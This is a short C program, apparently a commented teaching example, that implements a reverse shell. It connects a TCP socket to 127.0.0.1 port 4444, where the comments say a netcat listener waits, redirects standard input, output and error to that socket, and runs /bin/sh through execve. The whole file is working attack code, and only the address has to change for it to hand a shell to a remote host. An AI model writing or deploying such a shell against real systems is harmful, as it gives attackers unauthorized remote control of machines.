#include <netinet/ip.h>

int main() {
    int client_socket_fd;

    // define an array made up of 1 value: 0
    // this way I don't have to pass NULL pointers to execve
    char *empty[] = {0};
    struct sockaddr_in client_address;

    // create a TCP socket
    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // connect to 127.0.0.1:4444
    // where netcat is listening
    // /bin/sh -c "nc -v -l 4444"
    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);

    // connect to the socket
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // redirect stdin/stdout/stderr to the client socket
    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    // now that the standard file descriptors are redirected
    // once we spawn /bin/sh, input/output/error are going to be bound
    //      to the client socket
    execve("/bin/sh", empty, empty);
}
